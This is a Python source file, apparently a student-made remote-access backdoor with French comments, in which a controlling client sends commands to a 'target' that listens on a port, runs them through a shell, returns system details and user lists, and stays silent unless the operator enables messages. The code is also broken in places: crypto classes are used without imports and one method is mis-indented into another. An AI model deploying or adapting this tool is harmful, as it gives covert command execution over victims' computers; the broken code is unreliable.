import socket
import os
import subprocess
import platform


# Machine is the parent class for target and client
class Machine:
    def __init__(self):
        self.buffer = 2048
        # create socket
        try:
            self.s = socket.socket()
        except socket.error as msg:
            print("Socket creation error: " + str(msg))
# Us
    def key_generate(self):
        self.key_rsa = RSA.generate(1024)
        key_pub = self.key_rsa.publickey()
        key_b = key_pub.export_key()
        self.s.send(key_b)

    def recv_key_aes(self):
        key_aes_enc = self.s.recv(2048)
        iv_aes_enc = self.s.recv(2048)
        cipher_rsa = PKCS1_OAEP.new(self.key_rsa)  # Pareil que chiffrement
        self.key_aes = cipher_rsa.decrypt(key_aes_enc)
        cipher_rsa = PKCS1_OAEP.new(self.key_rsa)
        self.iv_aes = cipher_rsa.decrypt(iv_aes_enc)

    def recv_chiff_aes(self):
        mode_aes = AES.MODE_CFB
        text_enc = self.s.recv(2048)
        cipher_aes = AES.new(self.key_aes, mode_aes, iv=self.iv_aes)  # Pareil que RSA
        text = cipher_aes.decrypt(text_enc)
        print("le texte reçu est :", text.decode("utf-8"))

    def send_encrypt_msg(self, text_to_encrypt):
        if type(text_to_encrypt) == str:
            text_to_encrypt = text_to_encrypt.encode("utf-8")
        mode_aes = AES.MODE_CFB
        cipheraes = AES.new(self.key_aes, mode_aes, iv=self.iv_aes)  # Pareil que RSA
        text_enc = cipheraes.encrypt(text_to_encrypt)
        print('text en AES', text_enc)
        self.s.send(text_enc)
#target    
        def recv_key_rsa(self):
        key_pub_from_us = self.conn.recv(4096)
        self.key_pub_usable = RSA.import_key(key_pub_from_us)

    def echange_key(self):
        self.key_aes = get_random_bytes(16)
        self.iv_aes = get_random_bytes(16)
        cipherrsa = PKCS1_OAEP.new(self.key_pub_usable)  # Preparer l'algorithme de chiffrement
        key_aes_enc = cipherrsa.encrypt(self.key_aes)  # l'excuter en chiffrement
        cipherrsa = PKCS1_OAEP.new(self.key_pub_usable)
        iv_aes_enc = cipherrsa.encrypt(self.iv_aes)
        self.conn.send(key_aes_enc)
        self.conn.send(iv_aes_enc)

    def send_encrypt_msg(self, text_to_encrypt):
        if type(text_to_encrypt) == str:
            text_to_encrypt = text_to_encrypt.encode("utf-8")
        mode_aes = AES.MODE_CFB
        cipheraes = AES.new(self.key_aes, mode_aes, iv=self.iv_aes)  # Pareil que RSA
        text_enc = cipheraes.encrypt(text_to_encrypt)
        print('text en AES', text_enc)
        self.conn.send(text_enc)

    def recv_chiff_aes(self):
        mode_aes = AES.MODE_CFB
        text_enc = self.conn.recv(2048)
        cipher_aes = AES.new(self.key_aes, mode_aes, iv=self.iv_aes)  # Pareil que RSA
        text = cipher_aes.decrypt(text_enc)
        print("le texte reçu est :", text.decode("utf-8", errors="replace"))

    # Close the connection
    def quit(self):
        self.s.close()


# client is "us"
class Client(Machine):
    def __init__(self, host, port=9999):
        super().__init__()
        self.host = host  # Default: 127.0.0.1
        self.port = port
        self.connection_active = False  # use to exit the menu loop

    # try to connect to the server
    def connect_to_server(self):
        try:
            self.s.connect((self.host, self.port))
            self.connection_active = True
            print("Connexion has been establish | IP " + self.host + " | Port : " + str(self.port))
        except socket.gaierror as msg:
            print("the ip address is invalid")
            print("Error " + str(msg))

    def reverse_shell_send_command(self):
        try:
            self.s.send(str.encode("shell"))
            print("Welcome into the Shell Monitor: \nTo quit the shell write \"quit\"\n")
            print("-->", end=" ")
            while True:
                cmd = input("")
                if len(str.encode(cmd)) > 0:
                    self.s.send(str.encode(cmd, "utf-8"))
                    client_response = str(self.s.recv(self.buffer*4), "utf-8")
                    print(client_response, end="")
                    if cmd == "quit":
                        break
        except ConnectionResetError:
            self.quit()
        except OSError:
            print("The connection should be already closed")

    def getinfo(self, info):
        try:
            self.s.send(str.encode(str(info)))
            info = self.s.recv(self.buffer)
            print(info.decode("utf-8"))
            info = self.s.recv(self.buffer)
            print(info.decode("utf-8"))
            input("\n\nPress ENTER")
        except ConnectionResetError:
            self.quit()

    # decide if the target's programme show something
    def print_target(self, print_bool):
        if print_bool:
            self.s.send(str.encode("print_target_True"))
        else:
            self.s.send(str.encode("print_target_False"))

    # change the buffer size for the client and the target
    def set_target_buffer(self, size):
        try:
            self.s.send(str.encode("buffer_size"))
            self.s.send(str.encode(str(size)))
            print("Buffer size: " + str(self.buffer))
        except ConnectionResetError:
            self.quit()

    def quit(self):
        self.connection_active = False
        try:
            self.s.send(str.encode("quit"))
            response_target = self.s.recv(self.buffer)
            print(response_target.decode("utf-8"))
        except ConnectionResetError:
            print("We notice that the connection is already closed..")
        except OSError:
            print("Closed")
        super().quit()


# Target is the server
class Target(Machine):

    # initialize host and port server
    def __init__(self, host="", port=9999):
        super().__init__()
        self.host = host
        self.port = port
        self.conn = None
        self.information = []
        self.print = False

    # bind de socket with the port
    def socket_bind(self):
        if self.print:
            print("Binding socket to port " + str(self.port))
        try:
            self.s.bind((self.host, self.port))
            self.s.listen(5)
        except socket.error as msg:
            if self.print:
                print("Socket binding error: " + str(msg))

    # accept the new co
    def socket_accept(self):
        self.conn, self.information = self.s.accept()
        if self.print:
            print("Connexion has been establish | " + "IP " + self.information[0] + " | Port : " +
                  str(self.information[1]))

    # loop that wait for instruction from client
    def what_to_do(self):
        try:
            instruction = ""
            while instruction != "quit":
                instruction = self.conn.recv(self.buffer)
                instruction = instruction.decode("utf-8")
                if instruction == "print_target_True":
                    self.print = True
                    print("Hi, your favourite hacker decide to show you what he is doing :) What a great man")
                elif instruction == "print_target_False":
                    self.print = False
                elif instruction == "shell":
                    self.reverse_shell_target()
                elif instruction == "getinfo_generality":
                    self.getinfo_target_generality()
                elif instruction == "ipconfig" or instruction == "net user":
                    self.getinfo_target_cmd(instruction)
                elif instruction == "buffer_size":
                    self.change_buffer_size()
        except ConnectionResetError as msg:
            if self.print:
                print("Error : " + str(msg))
            self.quit()

    def reverse_shell_target(self):
        while True:
            data = self.conn.recv(self.buffer)
            if data.decode("utf-8") == "quit":
                if self.print:
                    print("Leaving Shell")
                self.conn.send(str.encode("we are leaving \n"))
                break
            else:
                try:
                    if data[:2].decode("utf-8") == 'cd':
                        os.chdir(data[3:].decode("utf-8"))
                    if len(data) > 0:
                        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE,
                                               stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                        output_bytes = cmd.stdout.read() + cmd.stderr.read()
                        output_str = output_bytes.decode("utf-8", errors='replace')
                        self.conn.send(str.encode(output_str + str(os.getcwd()) + "> "))
                        if self.print:
                            print(output_str)
                except OSError as msg:
                    error_msg = "Error OS : " + str(msg)
                    if self.print:
                        print(error_msg)
                    self.conn.send(str.encode(error_msg))

    # Get information from the target
    def getinfo_target_generality(self):
        self.conn.send(str.encode("INFORMATION'S TARGET: \n"))
        self.conn.send(str.encode("System: " + platform.uname()[0]
                               + "\nUser (node): " + platform.uname()[1]
                               + "\nRelease: " + platform.uname()[2]
                               + "\nVersion: " + platform.uname()[3]
                               + "\nMachine: " + platform.uname()[4]
                               + "\nProcessor: " + platform.uname()[5]))
        if self.print:
            print("YOUR INFORMATION \n")
            print("System: " + platform.uname()[0] + "\nUser (node): " + platform.uname()[1] + "\nRelease: "
                  + platform.uname()[2] + "\nVersion: " + platform.uname()[3] + "\nMachine: " + platform.uname()[4]
                  + "\nProcessor: " + platform.uname()[5])

    # usr reverse shell to send back information (ip & user list)
    def getinfo_target_cmd(self, command):
        cmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                               stdin=subprocess.PIPE)
        output_bytes = cmd.stdout.read() + cmd.stderr.read()
        output_str = output_bytes.decode("utf-8", errors='replace')
        self.conn.send(str.encode(command))
        self.conn.send(str.encode(output_str))
        if self.print:
            print(command)
            print(output_str)

    # define the buffer size
    def change_buffer_size(self):
        self.buffer = int(self.conn.recv(self.buffer))
        if self.print:
            print("the buffer size is", self.buffer)

    # close de connection and the socket
    def quit(self):
        try:
            self.conn.send(str.encode("The connection is closing. Say bye to \n\tIP: " + self.information[0] +
                                      " \n\tPort " + str(self.information[1])))
            self.conn.close()
            super().quit()
        except socket.error as msg:
            if self.print:
                print("the socket fail to close : " + str(msg))
        except ConnectionResetError:
            if self.print:
                print("The connection has already been stopped")
            super().quit()


